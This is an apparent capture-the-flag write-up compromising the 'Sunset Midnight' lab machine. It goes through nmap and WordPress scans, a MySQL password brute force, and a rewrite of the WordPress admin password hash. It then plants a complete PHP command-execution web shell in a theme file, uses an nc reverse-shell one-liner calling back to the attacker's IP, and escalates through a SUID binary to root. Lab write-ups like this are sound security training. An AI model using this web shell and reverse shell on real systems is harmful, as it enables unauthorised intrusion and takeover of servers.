first enumeration with nmap 

```
# Nmap 7.93 scan initiated Thu May 25 11:30:36 2023 as: nmap -sC -sV -T4 -oN normal.txt -p 22,80,3306 -Pn 192.168.204.88
Nmap scan report for 192.168.204.88
Host is up (0.14s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 9cfe0b8b8d15e7727e3c23e58655512d (RSA)
|   256 feebef5d40e706679b6367f8d97ed3e2 (ECDSA)
|_  256 3583682c338bb46c2421200d52edcd16 (ED25519)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Did not follow redirect to http://sunset-midnight/
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: Apache/2.4.38 (Debian)
3306/tcp open  mysql   MySQL 5.5.5-10.3.22-MariaDB-0+deb10u1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.22-MariaDB-0+deb10u1
|   Thread ID: 20
|   Capabilities flags: 63486
|   Some Capabilities: SupportsCompression, IgnoreSpaceBeforeParenthesis, FoundRows, ODBCClient, SupportsLoadDataLocal, Speaks41ProtocolOld, Speaks41ProtocolNew, DontAllowDatabaseTableColumn, SupportsTransactions, IgnoreSigpipes, LongColumnFlag, InteractiveClient, Support41Auth, ConnectWithDatabase, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: ?X~0ssi6nI`*M%mx32D=
|_  Auth Plugin Name: mysql_native_password
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu May 25 11:30:53 2023 -- 1 IP address (1 host up) scanned in 16.95 seconds
```
add `sunset-midnight` to `/etc/hosts` file.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/fadb3858-e96c-4e4a-ab4e-022d138d05c9)

noticed a web server on port 80, opening it on a browser, got directed to a wordpress web page. let's run wpscan.

```
wpscan --url http://sunset-midnight/ --enumerate p,t,u
```

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/79ea7cf9-ae3f-48b4-a1fe-bc8b2ae4a97e)

found a plugin `simply poll master`

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/266922dc-4908-47a4-a9b2-0cbe6164083c)

found a user `admin`. searched for exploit for the plugin, no success. tried tp bruteforce `admin` password. could not get the password. let's move to the next port `mysql:3306`

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PG/SunsetMidnight]
└─$ mysql -h sunset-midnight -u root -p                                                                     
Enter password: 
ERROR 1045 (28000): Access denied for user 'root'@'192.168.45.210' (using password: YES)
                                                                                                                                                                       
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PG/SunsetMidnight]
└─$ mysql -h sunset-midnight -u root    
ERROR 1045 (28000): Access denied for user 'root'@'192.168.45.210' (using password: NO)
```
tried to login mysql as `root:root`, and as `root` without password, failed. let's try bruteforce

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/d424bde2-c79b-49a3-afd0-b2b23e5b9674)

bull's eye, we got the password for mysql. let's login

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PG/SunsetMidnight]
└─$ mysql -h sunset-midnight -u root -p                                                                     
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 7625
Server version: 10.3.22-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| wordpress_db       |
+--------------------+
4 rows in set (0.177 sec)

MariaDB [(none)]> use wordpress_db
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [wordpress_db]>
```
cool we logged in mysql and select the `wordpress_db`. let's check the tables available.

```
MariaDB [wordpress_db]> show tables;
+------------------------+
| Tables_in_wordpress_db |
+------------------------+
| wp_commentmeta         |
| wp_comments            |
| wp_links               |
| wp_options             |
| wp_postmeta            |
| wp_posts               |
| wp_sp_polls            |
| wp_term_relationships  |
| wp_term_taxonomy       |
| wp_termmeta            |
| wp_terms               |
| wp_usermeta            |
| wp_users               |
+------------------------+
13 rows in set (0.176 sec)

MariaDB [wordpress_db]> select * from wp_users;
+----+------------+------------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email          | user_url               | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+
|  1 | admin      | $P$BaWk4oeAmrdn453hR6O6BvDqoF9yy6/ | admin         | example@example.com | http://sunset-midnight | 2020-07-16 19:10:47 |                     |           0 | admin        |
+----+------------+------------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+
1 row in set (0.168 sec)

MariaDB [wordpress_db]>
```
cool we got the admin password hash, let's change the password. 

```
MariaDB [wordpress_db]> update wp_users SET user_pass='21232f297a57a5a743894a0e4a801fc3' WHERE id='1';
Query OK, 1 row affected (0.212 sec)
Rows matched: 1  Changed: 1  Warnings: 0

MariaDB [wordpress_db]>
```
changed the password hash where `21232f297a57a5a743894a0e4a801fc3` is the md5 for "admin". now let's login `wp-admin`.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/af507b68-be0e-41d6-96ff-7ccf528950e9)

login using `admin:admin`.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/5b9ba614-85bc-49fd-919b-6a001f2d4c69)

Bingo!!! we are in. let's play around and look for how to get a shell.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/9d3ee264-5c23-4a08-ae12-6caa85168860)

navigate to the theme editor section, select theme twentynineteen, and choose the 404.php file and put a php web shell, click update to save.

```
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```
php web shell payload. Now let's navigate to the path where this shell it.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/633328a1-309a-4eab-b7c1-4911a88564c3)

got the shell path `http://sunset-midnight/wp-content/themes/twentynineteen/404.php` and boom we got RCE. let's pop a reverse shell. fire ncat listener 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/28d6ed6f-f552-4686-8708-129afdcf5c80)

send a revshell payload `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.210 1337 >/tmp/f` and check back ncat listener. 

```
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PG/SunsetMidnight]
└─$ ncat -lnvp 1337                                                 
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 192.168.204.88.
Ncat: Connection from 192.168.204.88:37304.
bash: cannot set terminal process group (556): Inappropriate ioctl for device
bash: no job control in this shell
www-data@midnight:/var/www/html/wordpress/wp-content/themes/twentynineteen$ id 
<tml/wordpress/wp-content/themes/twentynineteen$ id                         
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@midnight:/var/www/html/wordpress/wp-content/themes/twentynineteen$ 
```
Bingo! we got a reverse shell.


## Privilege Escalation

```
www-data@midnight:/home/jose$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/su
/usr/bin/sudo
/usr/bin/fusermount
/usr/bin/status
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/gpasswd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
www-data@midnight:/home/jose$
```
looking for suid, found `/usr/bin/status` let's check it out.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/dd658030-149a-4cc1-9824-79b7a47408bc)

running the binary file showed us what service is running, we can see it did not exit after checking the service status. putting a payload `!/bin/bash` got us a root shell. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/4b994f06-9fde-4ea4-a8fa-cf3bf005fec2)

and we are through... 😉 had fun yeah?
